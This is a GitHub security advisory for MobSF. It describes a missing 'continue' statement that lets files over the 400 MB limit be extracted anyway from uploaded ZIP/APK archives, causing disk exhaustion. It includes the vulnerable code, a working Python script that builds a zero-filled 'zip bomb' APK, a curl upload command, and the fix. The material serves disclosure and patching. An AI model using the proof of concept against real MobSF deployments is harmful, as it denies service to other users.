# [M] MobSF Vulnerable to Zip Bomb Denial of Service via Per-File Size Limit Bypass in ZIP/APK Extraction

## Summary
Severity: Medium
Advisory: GHSA-x768-8642-mmq9
CVE: CVE-2026-68924
CWE: CWE-400
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-x768-8642-mmq9
Type: github-advisory

## Affected
- PyPI: `mobsf` — affected >=0 <4.5.1

## Details
### Summary

When extracting uploaded ZIP/APK files, MobSF checks if individual files exceed `ZIP_MAX_UNCOMPRESSED_FILE_SIZE` (400 MB) and logs "Skipping" — but the code lacks a `continue` statement, so extraction proceeds anyway. The log message is misleading; the file is still written to disk.

### Verified Impact (Code Audit)

The vulnerable code path in `shared_func.py` lines 153–182:

```python
# Line 156: Size check
if fileinfo.file_size > settings.ZIP_MAX_UNCOMPRESSED_FILE_SIZE:
    size_mb = fileinfo.file_size / (1024 * 1024)
    msg = (f'File too large ({size_mb:.2f} MB). Skipping '
           f'{sanitize_for_logging(file_path)}')
    logger.warning(msg)
    # ← BUG: No 'continue' here! Execution falls through.

# Line 161: Total size check (separate)
if total_size > settings.ZIP_MAX_UNCOMPRESSED_TOTAL_SIZE:
    raise Exception(msg)

# Line 171-178: Permission fixing (only dirs get 'continue')
if fileinfo.is_dir():
    continue
else:
    fileinfo.external_attr = ...

# Line 182: EXTRACTION ALWAYS HAPPENS FOR FILES
try:
    zipptr.extract(file_path, ext_path)   # ← Runs regardless of size check
```

The control flow is clear: after the size check logs "Skipping", no `continue` or `break` is issued. The code proceeds to line 182 which extracts the file unconditionally.

### Steps to Reproduce

**1.** Create a ZIP/APK with a file exceeding 400 MB (zeros compress very well):

```python
#!/usr/bin/env python3
import zipfile, tempfile, os

output = tempfile.mktemp(suffix='.apk')
with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('AndroidManifest.xml', '<manifest package="com.poc"/>')
    # 450 MB file (exceeds 400 MB limit) — compresses to ~KB
    info = zipfile.ZipInfo('assets/huge.bin')
    info.compress_type = zipfile.ZIP_DEFLATED
    with zf.open(info, 'w') as f:
        for _ in range(450):
            f.write(b'\x00' * (1024 * 1024))  # 1 MB at a time

print(f"Created: {output} ({os.path.getsize(output)} bytes compressed)")
```

**2.** Upload via API:

```bash
curl -X POST http://127.0.0.1:8000/api/v1/upload \
  -H "X-Mobsf-Api-Key: YOUR_KEY" \
  -F "file=@poc.apk"
```

**3.** Trigger scan, then verify:

```bash
# Log says "Skipping" but file exists on disk:
grep "File too large" ~/.MobSF/debug.log
ls -la ~/.MobSF/uploads/HASH/assets/huge.bin  # 450 MB file is there
```

### Why This Is Not a Self-Bug

- This affects any user who scans a maliciously crafted APK
- The APK could come from a legitimate-looking package submitted for security review
- Matches the pattern of GHSA-c5vg-26p8-q8cr (Zip bomb DoS, affected <=4.3.2) — that advisory fixed the total size limit but this per-file bypass persists
- Impact: disk exhaustion preventing further scans for other users

### Remediation

Add `continue` after the size warning:

```python
if fileinfo.file_size > settings.ZIP_MAX_UNCOMPRESSED_FILE_SIZE:
    size_mb = fileinfo.file_size / (1024 * 1024)
    msg = (f'File too large ({size_mb:.2f} MB). Skipping '
           f'{sanitize_for_logging(file_path)}')
    logger.warning(msg)
    continue  # ← ADD THIS LINE
```

## References
- https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-x768-8642-mmq9
- https://github.com/MobSF/Mobile-Security-Framework-MobSF/pull/2627
- https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/62563ca429a75b3e5d47a13b958e1d2e7d5e2bbf
- https://github.com/MobSF/Mobile-Security-Framework-MobSF
- https://github.com/MobSF/Mobile-Security-Framework-MobSF/releases/tag/v4.5.1
